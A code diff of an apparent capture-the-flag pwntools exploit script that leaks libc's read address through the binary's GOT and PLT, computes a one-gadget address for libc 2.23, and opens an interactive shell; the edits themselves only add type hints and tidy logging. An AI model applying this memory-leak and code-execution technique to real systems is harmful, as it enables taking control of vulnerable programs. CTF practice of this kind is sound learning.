@@ -6,7 +6,7 @@ def leak(self, a):
     pass
 
 
-def exp(self, a):
+def exp(self, a: pwnlib.tubes.sock.sock):
     read_got = self.elf.got['read']
     write_got = self.elf.got['write']
     write_plt = self.elf.plt['write']
@@ -26,17 +26,16 @@ def exp(self, a):
     a.sl(payload)
 
     read_addr = unpack(a.recvn(4), 'all')
-    a.lg(f"{read_addr=}")
+    a.lg(f"{read_addr=:#x}")
     one_addr = read_addr + one_offset - read_offset
 
     a.send(p32(one_addr))
     
 
-def get_flag(self, a):
+def get_flag(self, a: pwnlib.tubes.sock.sock):
     a.interactive()
     return
 
 ctf(argv, exp, get_flag,
-        bp=0x080484a6,
-        inter='../LIBC/libc6-i386_2.23-0ubuntu10_amd64/ld-2.23.so',
-        needed=['../LIBC/libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so'])
+    inter='../LIBC/libc6-i386_2.23-0ubuntu10_amd64/ld-2.23.so',
+    needed=['../LIBC/libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so'])
